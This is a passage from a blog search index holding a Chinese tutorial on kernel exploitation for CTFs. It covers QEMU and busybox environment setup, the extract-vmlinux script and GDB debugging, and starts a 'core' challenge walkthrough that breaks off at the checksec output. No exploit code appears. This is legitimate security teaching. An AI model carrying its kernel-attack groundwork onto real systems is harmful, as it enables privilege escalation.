<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kernel PWN入门</title>
    <link href="/2025/03/17/kernel-PWN/"/>
    <url>/2025/03/17/kernel-PWN/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这一部分是参考的arttnba3师傅的这篇博客，<a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/">Linux Kernel II：内核简易食用指北</a>。</p><p>这里简化了文章中的许多内容，旨在快速的搭建起一个kernel pwn的环境和理解pwn题中的一些关键文件的来源。如果想对kernel的知识有更深的一些了解，十分推荐去看arttnba3师傅的原文。</p><h2 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1.安装依赖"></a>1.安装依赖</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q">$ sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>$ sudo apt-<span class="hljs-built_in">get</span> install git fakeroot build-essential ncurses-<span class="hljs-built_in">dev</span> xz-utils<br>$ qemu flex libncurses5-<span class="hljs-built_in">dev</span> libssl-<span class="hljs-built_in">dev</span> bc bison libglib2<span class="hljs-number">.0</span>-<span class="hljs-built_in">dev</span> libfdt-<span class="hljs-built_in">dev</span> libpixman<span class="hljs-number">-1</span>-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span> libelf-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h2 id="2-获取内核镜像"><a href="#2-获取内核镜像" class="headerlink" title="2.获取内核镜像"></a>2.获取内核镜像</h2><p>直接下载发行版中已有的内核镜像，首先用以下命令列出可以下载的内核镜像：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo apt search linux-image- <br></code></pre></td></tr></table></figure><p>这里我选择的是</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$  sudo apt download linux-image-<span class="hljs-type">unsigned</span><span class="hljs-number">-6.8</span><span class="hljs-number">.0</span><span class="hljs-number">-40</span>-generic<br></code></pre></td></tr></table></figure><p>下载下来是一个deb文件，解压：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ dpkg -X ./linux-image-unsigned<span class="hljs-string">-6</span>.8.0<span class="hljs-string">-40</span>-generic_6.8.0<span class="hljs-string">-40</span>.40~22.04.3_amd64.deb extract<br></code></pre></td></tr></table></figure><p>其中，\extract\boot下的vmlinuz-6.8.0-40-generic就是我们之后经常见到的bzImage内核镜像文件。</p><h1 id="使用-busybox-构建文件系统"><a href="#使用-busybox-构建文件系统" class="headerlink" title="使用 busybox 构建文件系统"></a>使用 busybox 构建文件系统</h1><h2 id="1-编译busybox"><a href="#1-编译busybox" class="headerlink" title="1.编译busybox"></a>1.编译busybox</h2><p>首先可以在<a href="https://busybox.net/downloads/">https://busybox.net/downloads/</a>这里下载自己想要的版本。我选择的是busybox-1.37.0.tar.bz2这个版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ wget https:<span class="hljs-regexp">//</span>busybox.net<span class="hljs-regexp">/downloads/</span>busybox-<span class="hljs-number">1.37</span>.<span class="hljs-number">0</span>.tar.bz2<br></code></pre></td></tr></table></figure><p>解压：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>tar -jxvf busybox-<span class="hljs-number">1.37</span>.<span class="hljs-number">0</span>.tar.bz2<br></code></pre></td></tr></table></figure><p>接下来我们配置编译选项：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> busybox<span class="hljs-literal">-1</span>.<span class="hljs-number">37.0</span>/<br><span class="hljs-variable">$</span> make menuconfig<br></code></pre></td></tr></table></figure><p>进入到图形化界面，使用空格勾选<strong>Settings</strong>–&gt;**Build static binary (no shared libs) (NEW)**。</p><p>接下来就是编译：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>make -j<span class="hljs-variable">$(</span>nproc)<br><span class="hljs-variable">$ </span>make install<br></code></pre></td></tr></table></figure><p>编译完成后会生成一个 _install 目录，接下来我们将会用它来构建文件系统。</p><h2 id="2-构建文件系统"><a href="#2-构建文件系统" class="headerlink" title="2.构建文件系统"></a>2.构建文件系统</h2><p>初始化：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> _install/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> -pv &#123;bin,sbin,etc,proc,sys,dev,home/ctf,root,tmp,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> etc/inittab</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> etc/init.d</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> etc/init.d/rcS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ./etc/init.d/rcS</span><br></code></pre></td></tr></table></figure><p>配置 etc&#x2F;inttab ，写入如下内容：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">::sysinit:/etc/init.d/rcS</span><br><span class="hljs-meta">::askfirst:/bin/ash</span><br><span class="hljs-meta">::ctrlaltdel:/sbin/reboot</span><br><span class="hljs-meta">::shutdown:/sbin/swapoff</span> -a<br><span class="hljs-meta">::shutdown:/bin/umount</span> -a -r<br><span class="hljs-meta">::restart:/sbin/init</span><br></code></pre></td></tr></table></figure><p>然后在_install目录下创建init文件，写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">chown</span> -R root:root /<br><span class="hljs-built_in">chmod</span> 700 /root<br><span class="hljs-built_in">chown</span> -R ctf:ctf /home/ctf<br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t tmpfs tmpfs /tmp<br><span class="hljs-built_in">mkdir</span> /dev/pts<br>mount -t devpts devpts /dev/pts<br><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br><br><span class="hljs-built_in">cd</span> /home/ctf<br>su ctf -c sh<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>添加可执行权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ./init</span><br></code></pre></td></tr></table></figure><p>接下来配置用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:x:0:0:root:/root:/bin/sh&quot;</span> &gt; etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot;</span> &gt;&gt; etc/passwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:x:0:&quot;</span> &gt; etc/group</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf:x:1000:&quot;</span> &gt;&gt; etc/group</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;none /dev/pts devpts gid=5,mode=620 0 0&quot;</span> &gt; etc/fstab</span><br></code></pre></td></tr></table></figure><h2 id="3-打包镜像"><a href="#3-打包镜像" class="headerlink" title="3.打包镜像"></a>3.打包镜像</h2><p>使用如下命令打包文件系统为 cpio 格式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-built_in">find</span> . | cpio -o <span class="hljs-attribute">--format</span>=newc &gt; <span class="hljs-built_in">..</span>/<span class="hljs-built_in">..</span>/rootfs.cpio<br></code></pre></td></tr></table></figure><p>这里我打包到了桌面上，当然这里可以打包到任意喜欢的位置。</p><h2 id="4-使用qemu运行内核"><a href="#4-使用qemu运行内核" class="headerlink" title="4.使用qemu运行内核"></a>4.使用qemu运行内核</h2><p>首先下载qemu：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> sudo apt update<br><span class="hljs-symbol">$</span> sudo apt install qemu-<span class="hljs-keyword">system</span>-x86 qemu-utils<br></code></pre></td></tr></table></figure><p>将之前的rootfs.cpio和bzImage（就是这个：vmlinuz-6.8.0-40-generic）放在同一个目录下</p><p>然后我们编写启动脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> boot.sh</span><br></code></pre></td></tr></table></figure><p>向脚本中写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd  ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -smp cores=2,threads=1 \<br>    -nographic \<br>    -s<br></code></pre></td></tr></table></figure><p>接下来运行脚本：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ <span class="hljs-keyword">sh</span> <span class="hljs-keyword">boot</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>启动成功：</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><br>Boot took <span class="hljs-number">5.24</span> seconds<br><br>~ $ ls /<br>bin      etc      init     lib64    <span class="hljs-keyword">proc</span><span class="hljs-title">     sbin</span> <span class="hljs-title">    tmp</span><br>dev<span class="hljs-title">      home</span> <span class="hljs-title">    lib</span> <span class="hljs-title">     linuxrc</span> <span class="hljs-title"> root</span> <span class="hljs-title">    sys</span> <span class="hljs-title">     usr</span><br>~ $<span class="hljs-title"> whoami</span><br>ctf<br>~ $<br></code></pre></td></tr></table></figure><p>至此，我们构建了一个十分简单内核并且成功运行。</p><h1 id="kerinel-pwn的一些基础知识"><a href="#kerinel-pwn的一些基础知识" class="headerlink" title="kerinel pwn的一些基础知识"></a>kerinel pwn的一些基础知识</h1><p>关于这个部分，网上已经有不少优秀的文章了，并且kernel的知识多的吓人，我在此就不多做赘述了，为大家贴出几篇优秀的文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">ctfwiki</a></p><p><a href="https://xz.aliyun.com/news/7220?u_atoken=a509cb116390777bd93e36dd73b4e040&u_asig=ac11000117416033495173919e0049">Linux Kernel Pwn 初探</a></p><p><a href="https://bbs.kanxue.com/homepage-818602.htm">钞sir师傅的论坛</a></p><p><a href="https://blog.wohin.me/posts/linux-kernel-pwn-01/">Linux Kernel PWN | 01 From Zero to One</a></p><h1 id="一些常用的命令和调试方法"><a href="#一些常用的命令和调试方法" class="headerlink" title="一些常用的命令和调试方法"></a>一些常用的命令和调试方法</h1><h2 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h2><p>打包文件系统为 cpio 格式：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-built_in">find</span> . | cpio -o <span class="hljs-attribute">--format</span>=newc &gt; <span class="hljs-built_in">..</span>/rootfs.cpio<br></code></pre></td></tr></table></figure><p>解压cpio文件：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>cpio -idmv &lt; rootfs.cpio<br></code></pre></td></tr></table></figure><p>如果我们用<strong>file</strong>命令发现文件经过gzip压缩，就像这样：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">$ <span class="hljs-keyword">file</span> ../rootfs.cpio<br>../rootfs.cpio: gzip compressed <span class="hljs-keyword">data</span>, last modified: Tue Jul  <span class="hljs-number">4</span> <span class="hljs-number">08</span>:<span class="hljs-number">39</span>:<span class="hljs-number">15</span> <span class="hljs-number">2017</span>, <span class="hljs-built_in">max</span> compression, from Unix, original <span class="hljs-built_in">size</span> <span class="hljs-built_in">modulo</span> <span class="hljs-number">2</span>^<span class="hljs-number">32</span> <span class="hljs-number">2844672</span><br></code></pre></td></tr></table></figure><p>就要使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gunzip -c ../rootfs.cpio &gt; rootfs.cpio.extracted  <span class="hljs-comment"># 解压gzip，生成cpio归档文件</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">cpio -idmv &lt; rootfs.cpio.extracted  <span class="hljs-comment"># 提取cpio归档内容到当前目录</span></span><br></code></pre></td></tr></table></figure><p>由于我们在kernel中写exp要用c语言并且编译为可执行程序，所以要用到：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$ gcc <span class="hljs-built_in">exp</span>.c -<span class="hljs-keyword">static</span> -masm=intel -g -o <span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p>有时题目不会给我们vmlinux这个文件，我们可以用脚本提取出来，提取vmlinux的脚本也可以在Linux的GitHub上找到：<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux。</a>。<br>这里我们也直接给出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><span class="hljs-comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Inspired from extract-ikconfig</span><br><span class="hljs-comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><br><span class="hljs-function"><span class="hljs-title">check_vmlinux</span></span>()<br>&#123;<br>    <span class="hljs-comment"># Use readelf to check if it&#x27;s a valid ELF</span><br>    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span><br>    <span class="hljs-comment">#       and not just an elf</span><br>    readelf -h <span class="hljs-variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="hljs-built_in">return</span> 1<br><br>    <span class="hljs-built_in">cat</span> <span class="hljs-variable">$1</span><br>    <span class="hljs-built_in">exit</span> 0<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">try_decompress</span></span>()<br>&#123;<br>    <span class="hljs-comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br>    <span class="hljs-comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><br>    <span class="hljs-comment"># Try to find the header ($1) and decompress from here</span><br>    <span class="hljs-keyword">for</span>    pos <span class="hljs-keyword">in</span> `<span class="hljs-built_in">tr</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>\n<span class="hljs-variable">$2</span>&quot;</span> <span class="hljs-string">&quot;\n<span class="hljs-variable">$2</span>=&quot;</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> | grep -abo <span class="hljs-string">&quot;^<span class="hljs-variable">$2</span>&quot;</span>`<br>    <span class="hljs-keyword">do</span><br>        pos=<span class="hljs-variable">$&#123;pos%%:*&#125;</span><br>        <span class="hljs-built_in">tail</span> -c+<span class="hljs-variable">$pos</span> <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> | <span class="hljs-variable">$3</span> &gt; <span class="hljs-variable">$tmp</span> 2&gt; /dev/null<br>        check_vmlinux <span class="hljs-variable">$tmp</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment"># Check invocation:</span><br>me=<span class="hljs-variable">$&#123;0##*/&#125;</span><br>img=<span class="hljs-variable">$1</span><br><span class="hljs-keyword">if</span>    [ <span class="hljs-variable">$#</span> -ne 1 -o ! -s <span class="hljs-string">&quot;<span class="hljs-variable">$img</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Prepare temp files:</span><br>tmp=$(<span class="hljs-built_in">mktemp</span> /tmp/vmlinux-XXX)<br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;rm -f <span class="hljs-variable">$tmp</span>&quot;</span> 0<br><br><span class="hljs-comment"># That didn&#x27;t work, so retry after decompression.</span><br>try_decompress <span class="hljs-string">&#x27;\037\213\010&#x27;</span> xy    gunzip<br>try_decompress <span class="hljs-string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz<br>try_decompress <span class="hljs-string">&#x27;BZh&#x27;</span>          xy    bunzip2<br>try_decompress <span class="hljs-string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma<br>try_decompress <span class="hljs-string">&#x27;\211\114\132&#x27;</span> xy    <span class="hljs-string">&#x27;lzop -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="hljs-string">&#x27;lz4 -d&#x27;</span><br>try_decompress <span class="hljs-string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd<br><br><span class="hljs-comment"># Finally check for uncompressed images or objects:</span><br>check_vmlinux <span class="hljs-variable">$img</span><br><br><span class="hljs-comment"># Bail out:</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2<br></code></pre></td></tr></table></figure><p>把代码复制到文件中，保存为extract-vmlinux，然后赋予执行权限。提取vmlinux命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><p>之后我们就可以用ROPgadget或者ropper找gadget了。</p><h2 id="动态调试的方法"><a href="#动态调试的方法" class="headerlink" title="动态调试的方法"></a>动态调试的方法</h2><p>介绍一下使用GDB进行动调的方法：</p><p>首先我们要得到.ko驱动的符号表，这个地址在内核中的&#x2F;sys&#x2F;module&#x2F;core&#x2F;section&#x2F;.text里，可以用<strong>cat</strong>来查看，但是这个位置一般都需要root权限，为了方便调试，要修改init中的启动权限：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#setsid <span class="hljs-regexp">/bin/</span>cttyhack setuidgid <span class="hljs-number">1000</span> <span class="hljs-regexp">/bin/</span>sh <br>setsid <span class="hljs-regexp">/bin/</span>cttyhack setuidgid <span class="hljs-number">0</span> <span class="hljs-regexp">/bin/</span>sh     -&gt; root<br></code></pre></td></tr></table></figure><p>接下来启动内核，使用<strong>cat &#x2F;sys&#x2F;module&#x2F;core&#x2F;section&#x2F;.text</strong>得到.text的地址。</p><p>使用<strong>gdb .&#x2F;vmlinux -q</strong>启动gdb，<br>但是此时没有加载驱动.ko的符号表，需要使用</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">pwndbg&gt;<span class="hljs-built_in"> add-symbol-file </span>filename.ko textaddr<br></code></pre></td></tr></table></figure><p>来加载，</p><p>然后就可以使用<strong>b</strong>下断点了，之后再使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; target remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>就可以连接上kernel了。</p><h1 id="两个例题"><a href="#两个例题" class="headerlink" title="两个例题"></a>两个例题</h1><h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><p>解压完成后有四个文件，</p><ul><li>bzImage：压缩的内核映像</li><li>core.cpio：文件系统映像</li><li>start.sh：用于启动 kernel 的 shell 的脚本</li><li>vmlinux：静态链接的可执行文件格式的 Linux 内核</li></ul><p>先让我们查看一下start.sh的内容：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript">qemu-system-x86_64 <span class="hljs-string">\</span><br>-m <span class="hljs-number">64</span>M <span class="hljs-string">\</span><br>-kernel ./bzImage <span class="hljs-string">\</span><br>-initrd  ./core.cpio <span class="hljs-string">\</span><br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> <span class="hljs-string">\</span><br>-s  <span class="hljs-string">\</span>  <span class="hljs-comment"># 启用 GDB 调试服务器，默认监听 localhost:1234</span><br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 <span class="hljs-string">\</span><br>-nographic  <span class="hljs-string">\</span><br><br></code></pre></td></tr></table></figure><p>启用了kaslr保护，并且最好将64M改为128M或者256M，否则可能会启动失败。</p><p>接下来把core.cpio解压出来，查看init文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc  <br>mount -t sysfs sysfs /sys <br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms  <span class="hljs-comment"># 将内核符号表转储到 /tmp/kallsyms</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict <span class="hljs-comment"># 禁止普通用户查看内核符号地址，但是由于上一行转储了文件，这一行实际上就没有用了</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict <span class="hljs-comment">#禁止普通用户查看内核日志，即不能通过dmesg查看kernel的信息</span><br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko  <span class="hljs-comment">#加载内核模块 core.ko</span><br><br>poweroff -d 120 -f &amp; <span class="hljs-comment">#后台启动 120 秒后强制关机，可以把这一行注释</span><br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br><br></code></pre></td></tr></table></figure><p>从上面的脚本注意到：&#x2F;proc&#x2F;kallsyms的内容被转储到了&#x2F;tmp&#x2F;kallsyms，这就意味着我们可以在普通权限下得到函数的地址。</p><p>然后，让我们着重分析core.ko这个文件，checksec一下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x0)</span><br><span class="hljs-attr">Stripped:</span>   <span 